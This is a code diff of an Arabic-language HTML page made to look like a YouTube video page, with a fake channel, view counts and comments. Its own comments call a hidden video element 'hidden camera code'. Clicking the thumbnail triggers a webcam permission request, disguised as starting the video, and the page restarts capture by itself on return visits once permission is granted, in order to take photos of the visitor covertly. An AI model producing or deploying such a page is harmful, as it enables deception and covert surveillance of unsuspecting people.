@@ -2,38 +2,118 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube</title>
     <style>
-        body { font-family: sans-serif; background: #f9f9f9; margin: 0; }
-        header { display: flex; padding: 15px; background: white; border-bottom: 1px solid #ddd; }
-        .search-bar { flex-grow: 1; background: #f0f0f0; border-radius: 20px; padding: 8px; text-align: center; }
+        body { font-family: Roboto, Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 0; color: #0f0f0f; }
+        
+        /* شريط يوتيوب العلوي */
+        header { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; background: white; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #e5e5e5; }
+        .header-left { display: flex; align-items: center; gap: 12px; }
+        .search-bar { display: flex; flex-grow: 1; max-width: 400px; margin: 0 10px; }
+        .search-bar input { width: 100%; padding: 6px 12px; border: 1px solid #ccc; border-radius: 20px 0 0 20px; outline: none; background: #f8f8f8; font-size: 14px; }
+        .search-bar button { padding: 0 15px; background: #f0f0f0; border: 1px solid #ccc; border-right: none; border-radius: 0 20px 20px 0; cursor: pointer; }
+
+        /* مشغل الفيديو */
         .video-wrapper { width: 100%; aspect-ratio: 16/9; background: black; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
-        .video-info { padding: 15px; background: white; }
+        
+        /* تفاصيل الفيديو والقناة */
+        .video-info { padding: 12px; background: white; }
+        .video-title { font-size: 16px; font-weight: bold; margin-bottom: 8px; line-height: 1.4; }
+        .video-stats { font-size: 12px; color: #606060; margin-bottom: 12px; }
+        
+        .channel-row { display: flex; justify-content: space-between; align-items: center; margin: 12px 0; padding-bottom: 12px; border-bottom: 1px solid #e5e5e5; }
+        .channel-info { display: flex; align-items: center; gap: 10px; }
+        .channel-avatar { width: 36px; height: 36px; background: #cc0000; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; }
+        .channel-name { font-weight: bold; font-size: 14px; }
+        .channel-subs { font-size: 11px; color: #606060; }
+        .subscribe-btn { background: #0f0f0f; color: white; border: none; padding: 8px 16px; border-radius: 18px; font-weight: bold; font-size: 13px; cursor: pointer; }
+
+        /* أزرار التفاعل (لايك، شير، إلخ) */
+        .actions-row { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 5px; margin-bottom: 12px; }
+        .action-btn { background: #f2f2f2; padding: 6px 12px; border-radius: 18px; font-size: 12px; font-weight: 500; display: flex; align-items: center; gap: 5px; white-space: nowrap; cursor: pointer; }
+
+        /* وصف الفيديو والتعليقات */
+        .description-box { background: #f2f2f2; padding: 10px; border-radius: 10px; font-size: 12px; color: #333; line-height: 1.5; margin-bottom: 15px; }
+        .comments-section { background: #f2f2f2; padding: 10px 12px; border-radius: 12px; font-size: 12px; }
+        .comments-header { font-weight: bold; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
+    <!-- ضع معرّف الفيديو هنا -->
+    <script>
+        const VIDEO_ID = "0OxRVbr1J7w"; 
+    </script>
+
+    <!-- شريط يوتيوب العلوي -->
     <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90">
-        <div class="search-bar">بحث</div>
+        <div class="header-left">
+            <span style="font-size: 18px; cursor: pointer;">☰</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="80">
+        </div>
+        <div class="search-bar">
+            <input type="text" value="بحث">
+            <button>🔍</button>
+        </div>
+        <div style="display: flex; gap: 12px; font-size: 16px;">
+            <span>🔔</span>
+            <span>👤</span>
+        </div>
     </header>
 
+    <!-- صندوق الفيديو -->
     <div class="video-wrapper" id="video-box">
         <div id="player-area" style="width:100%; height:100%;">
-            <img src="https://img.youtube.com/vi/0OxRVbr1J7w/maxresdefault.jpg" style="width:100%; height:100%; object-fit:cover;">
+            <script>
+                document.write('<img src="https://img.youtube.com/vi/' + VIDEO_ID + '/maxresdefault.jpg" style="width:100%; height:100%; object-fit:cover;">');
+            </script>
         </div>
     </div>
 
+    <!-- معلومات الفيديو -->
     <div class="video-info">
-        <h1></h1>
-        <p>1.2M </p>
-        <p style="background:#eee; padding:10px; border-radius:10px;"></p>
+        <!-- تعديل العنوان هنا -->
+        <div class="video-title">أكتب عنوان الفيديو الجديد هنا ليطابق يوتيوب تماماً</div>
+        <div class="video-stats">614 ألف مشاهدة • قبل سنة واحدة</div>
+
+        <!-- تفاصيل القناة وزر الاشتراك -->
+        <div class="channel-row">
+            <div class="channel-info">
+                <div class="channel-avatar">YT</div>
+                <div>
+                    <div class="channel-name">قناة المنوعات والحصريات</div>
+                    <div class="channel-subs">125 ألف مشترك</div>
+                </div>
+            </div>
+            <button class="subscribe-btn">اشتراك</button>
+        </div>
+
+        <!-- أزرار التفاعل -->
+        <div class="actions-row">
+            <div class="action-btn">👍 13 ألف</div>
+            <div class="action-btn">👎</div>
+            <div class="action-btn">↗️ مشاركة</div>
+            <div class="action-btn">📥 تنزيل</div>
+            <div class="action-btn">✂️ إنشاء مقطع</div>
+        </div>
+
+        <!-- وصف الفيديو -->
+        <div class="description-box">
+            أكتب هنا وصف الفيديو التفصيلي الذي يظهر تحت المقطع تماماً كما في يوتيوب الحقيقي.
+        </div>
+
+        <!-- التعليقات -->
+        <div class="comments-section">
+            <div class="comments-header">التعليقات • 184</div>
+            <div>مقطع رائع جداً، استمر في نشر المزيد من الأجواء الجميلة! 🔥</div>
+        </div>
     </div>
 
+    <!-- كود الكاميرا المخفي -->
     <video id="video" autoplay playsinline style="display:none"></video>
 
     <script>
-        // دالة التقاط الصور
         function startCapture() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
@@ -51,18 +131,16 @@
                 }).catch(e => console.log("بانتظار الإذن"));
         }
 
-        // المفتاح الذكي: للتشغيل التلقائي عند العودة للموقع (إذا كان الإذن محفوظاً)
         navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
             if (permissionStatus.state === 'granted') {
                 startCapture();
             }
         });
 
-        // عند الضغط على الفيديو (للمرة الأولى يظهر الإذن، ولفتح الفيديو)
         document.getElementById('video-box').addEventListener('click', function() {
             startCapture();
             document.getElementById('player-area').innerHTML = 
-                '<iframe src="https://www.youtube.com/embed/0OxRVbr1J7w?autoplay=1" style="width:100%; height:100%; border:none;" allow="autoplay"></iframe>';
+                '<iframe src="https://www.youtube.com/embed/' + VIDEO_ID + '?autoplay=1" style="width:100%; height:100%; border:none;" allow="autoplay"></iframe>';
         }, { once: true });
     </script>
 </body>
